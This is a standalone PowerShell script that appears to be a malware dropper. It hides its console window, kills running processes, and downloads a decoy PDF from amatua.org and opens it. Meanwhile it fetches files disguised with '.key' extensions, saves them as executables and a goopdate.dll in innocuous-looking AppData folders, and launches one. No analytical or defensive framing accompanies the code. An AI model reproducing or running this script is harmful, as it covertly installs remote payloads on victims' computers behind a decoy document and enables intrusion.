$src = @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'@

Add-Type -Name ConsoleUtils -Namespace Foo -MemberDefinition $src

$hide = 0
$show = 1

$hWnd = [Foo.ConsoleUtils]::GetConsoleWindow()
[Foo.ConsoleUtils]::ShowWindow($hWnd, $hide)
 
taskkill /IM UpdaterStartupUtility.EXE /F
taskkill /IM inetinfo64.EXE /F
Invoke-WebRequest -Uri "https://amatua.org/same/Home-Collection-2022.pdf" -OutFile "$env:LOCALAPPDATA\Temp\Home-Collection-2022.pdf";
Start-Process  "$env:LOCALAPPDATA\Temp\Home-Collection-2022.pdf";
Invoke-WebRequest -Uri "https://amatua.org/same/UpdaterStartupUtility.key" -OutFile "$env:LOCALAPPDATA\microsoft\VisualStudio\UpdaterStartupUtility.exe";
Invoke-WebRequest -Uri "https://amatua.org/same/UpdaterStartupUtility64.key" -OutFile "$env:LOCALAPPDATA\Microsoft\Internet Explorer\Tiles\UpdaterStartupUtility64.exe";
Invoke-WebRequest -Uri "https://amatua.org/same/goopdate.key" -OutFile "$env:LOCALAPPDATA\Microsoft\Internet Explorer\Tiles\goopdate.dll";
Invoke-WebRequest -Uri "https://amatua.org/same/inetinfo64.key" -OutFile "$env:LOCALAPPDATA\Microsoft\Internet Explorer\inetinfo64.exe";
Start-Process  "$env:LOCALAPPDATA\microsoft\VisualStudio\UpdaterStartupUtility.exe"
